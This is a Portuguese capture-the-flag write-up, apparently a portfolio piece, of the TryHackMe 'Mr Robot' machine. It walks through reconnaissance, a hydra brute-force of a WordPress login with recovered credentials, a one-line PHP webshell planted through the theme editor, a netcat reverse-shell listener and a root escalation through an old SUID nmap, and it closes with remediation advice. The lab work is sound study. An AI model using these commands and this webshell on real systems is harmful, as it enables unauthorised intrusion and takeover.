<!-- ══════════════════════════ BANNER ══════════════════════════ -->
<div align="center">
  <img src="https://file.loading.io/color/feature/thumb/Blues-8.png?" width="100%" height="10px" alt="divider"/>
</div>

<div align="center">
  <img src="https://www.pulsetechnology.com/hs-fs/hubfs/Cybersecurity%20Graphic.gif?width=1600&height=511&name=Cybersecurity%20Graphic.gif" width="100%" alt="Cybersecurity Banner"/>
</div>

<div align="center">
  <img src="https://file.loading.io/color/feature/thumb/Blues-8.png?" width="100%" height="10px" alt="divider"/>
</div>

<br/>

<h1 align="center">Relatório de Pentest · Máquina "Mr Robot"</h1>
<p align="center"><em>TryHackMe · RabbitSec Red Team</em></p>

<div align="center">

<img src="https://img.shields.io/badge/Plataforma-TryHackMe-212C42?style=for-the-badge&logo=tryhackme&logoColor=white" alt="thm"/>
<img src="https://img.shields.io/badge/Risco-CRÍTICO-d50000?style=for-the-badge" alt="risco"/>
<img src="https://img.shields.io/badge/Flags-3%2F3-1987F0?style=for-the-badge" alt="flags"/>
<img src="https://img.shields.io/badge/Resultado-Root-1987F0?style=for-the-badge" alt="resultado"/>

</div>

<!-- ══════════════════════════ NAVEGAÇÃO ══════════════════════════ -->
<div align="center">

<a href="#resumo"><img src="https://img.shields.io/badge/▸_RESUMO-1987F0?style=for-the-badge" alt="resumo"/></a>
<a href="#falhas"><img src="https://img.shields.io/badge/▸_FALHAS-000000?style=for-the-badge" alt="falhas"/></a>
<a href="#attack-path"><img src="https://img.shields.io/badge/▸_ATTACK_PATH-1987F0?style=for-the-badge" alt="attackpath"/></a>
<a href="#recomendacoes"><img src="https://img.shields.io/badge/▸_RECOMENDAÇÕES-000000?style=for-the-badge" alt="reco"/></a>

</div>

<br/>

<div align="center">

| Classificação | Metodologia | Vetor inicial | Resultado |
|:---:|:---:|:---:|:---:|
| Público (Portfólio) | Black-box · PTES | WordPress + wordlist vazada | Root via SUID |

</div>

<div align="center">
  <img src="https://64.media.tumblr.com/f444263be6597f8981d2b9cf3d0c7408/f74decdc69e61f0a-9a/s400x600/a157756e4c56be0e5e51a9e4c79ba781a451e94a.gifv" width="100%" height="2px" alt="divider"/>
</div>

<!-- ══════════════════════════ RESUMO ══════════════════════════ -->
<a id="resumo"></a>
## Resumo Executivo e Impacto

A máquina **Mr Robot** cai por uma combinação clássica de **exposição de informação** e **higiene de credenciais ruim**. O `robots.txt` entregou a primeira flag e o nome de uma wordlist hospedada no próprio servidor (`fsocity.dic`), que depois serviu de dicionário contra o login do WordPress. Com acesso ao painel, um shell PHP no tema abriu o foothold.

A escalada para root não exigiu kernel exploit: um **`nmap` SUID em versão antiga, com modo interativo**, bastou para abrir um shell privilegiado. As três flags foram capturadas.

> **Risco:** Crítico · O site publica a própria wordlist de ataque e aceita força bruta sem bloqueio.

<div align="center">
  <img src="https://64.media.tumblr.com/f444263be6597f8981d2b9cf3d0c7408/f74decdc69e61f0a-9a/s400x600/a157756e4c56be0e5e51a9e4c79ba781a451e94a.gifv" width="100%" height="2px" alt="divider"/>
</div>

<!-- ══════════════════════════ FALHAS ══════════════════════════ -->
<a id="falhas"></a>
## Falhas Encontradas

| ID | Título | Severidade | Classe (OWASP) | Papel no ataque |
|----|--------|:----------:|----------------|-----------------|
| **R-01** | `robots.txt` expõe flag e wordlist (`fsocity.dic`) | Média | A01:2021 Controle de Acesso | Flag 1 e dicionário de ataque |
| **R-02** | Login WordPress sem bloqueio de força bruta | Alta | A07:2021 Autenticação | Credenciais `elliot:ER28-9U2` |
| **R-03** | Edição de tema habilitada no painel | Alta | A05:2021 Configuração Incorreta | Shell PHP como `daemon` |
| **R-04** | `nmap` SUID com modo interativo | Crítica | A05:2021 Configuração Incorreta | Shell root |

<div align="center">
  <img src="https://64.media.tumblr.com/f444263be6597f8981d2b9cf3d0c7408/f74decdc69e61f0a-9a/s400x600/a157756e4c56be0e5e51a9e4c79ba781a451e94a.gifv" width="100%" height="2px" alt="divider"/>
</div>

<!-- ══════════════════════════ ATTACK PATH ══════════════════════════ -->
<a id="attack-path"></a>
## Caminho de Ataque

### 1. Reconhecimento

```bash
nmap -sV -sC -p- <alvo> -oN scan.txt
```

- `80/tcp` · Apache httpd
- `443/tcp` · Apache httpd (SSL)

### 2. Exposição via robots.txt

```
User-agent: *
Disallow: /fsocity.dic
Disallow: /key-1-of-3.txt
```

`key-1-of-3.txt` é a **flag 1**. `fsocity.dic` é uma wordlist servida pelo próprio site, que vira o dicionário do próximo passo.

### 3. Força bruta no WordPress

Usuário `elliot` identificado pela mensagem de erro do `wp-login.php` (enumeração de usuário). Força bruta da senha com a wordlist vazada:

```bash
hydra -l elliot -P fsocity.dic <alvo> \
  http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=incorrect"
```

Resultado: `elliot:ER28-9U2`.

### 4. Foothold via tema

Pelo editor de tema do painel, injetei um webshell mínimo:

```php
<?php system($_GET['cmd']); ?>
```

```
http://<alvo>/wp-content/themes/twentyfifteen/cmd.php?cmd=id
```

Estabilizei em um shell reverso (listener `nc -lvnp <porta>`) e capturei a **flag 2** quebrando o hash MD5 encontrado em `/home/robot/password.raw-md5`.

### 5. Escalada para root via SUID

```bash
find / -perm -4000 2>/dev/null
# /usr/local/bin/nmap  (versão antiga)
```

O `nmap` antigo tem modo interativo, que executa comandos com o dono do binário (root):

```bash
/usr/local/bin/nmap --interactive
nmap> !sh
# whoami -> root
cat /root/key-3-of-3.txt   # flag 3
```

<div align="center">

| Flag | Localização | Método |
|:---:|---|---|
| key-1 | `/key-1-of-3.txt` | `robots.txt` |
| key-2 | `/home/robot/key-2-of-3.txt` | Quebra de hash MD5 |
| key-3 | `/root/key-3-of-3.txt` | Escalada SUID (`nmap`) |

</div>

<div align="center">
  <img src="https://64.media.tumblr.com/f444263be6597f8981d2b9cf3d0c7408/f74decdc69e61f0a-9a/s400x600/a157756e4c56be0e5e51a9e4c79ba781a451e94a.gifv" width="100%" height="2px" alt="divider"/>
</div>

<!-- ══════════════════════════ RECOMENDAÇÕES ══════════════════════════ -->
<a id="recomendacoes"></a>
## Recomendações

| Prioridade | Ação |
|:---:|---|
| P0 | Remover wordlists e arquivos sensíveis do webroot; revisar `robots.txt` (ele não protege, apenas aponta). |
| P0 | Remover o bit SUID de binários que não precisam (`chmod u-s`); auditar com `find / -perm -4000`. |
| P1 | Bloquear força bruta no login (rate limit, fail2ban, CAPTCHA) e padronizar mensagens de erro contra enumeração de usuário. |
| P1 | Desabilitar edição de temas/plugins pelo painel (`DISALLOW_FILE_EDIT`). |
| P2 | Substituir hashes MD5 por algoritmo moderno com salt (bcrypt/argon2). |

<div align="center">
  <img src="https://file.loading.io/color/feature/thumb/Blues-8.png?" width="100%" height="10px" alt="divider"/>
</div>

<div align="center">
<a href="../../README.md"><img src="https://img.shields.io/badge/◂_Voltar_ao_Portfólio-000000?style=for-the-badge&logo=github&logoColor=white" alt="portfolio"/></a>
<a href="https://github.com/douglascshun"><img src="https://img.shields.io/badge/Perfil_GitHub-181717?style=for-the-badge&logo=github&logoColor=white" alt="perfil"/></a>
<a href="https://www.linkedin.com/in/cshunderlick/"><img src="https://img.shields.io/badge/LinkedIn-0077B5?style=for-the-badge&logo=linkedin&logoColor=white" alt="linkedin"/></a>
<a href="https://tryhackme.com/p/D.r4bbi7"><img src="https://img.shields.io/badge/TryHackMe-212C42?style=for-the-badge&logo=tryhackme&logoColor=white" alt="thm"/></a>
</div>
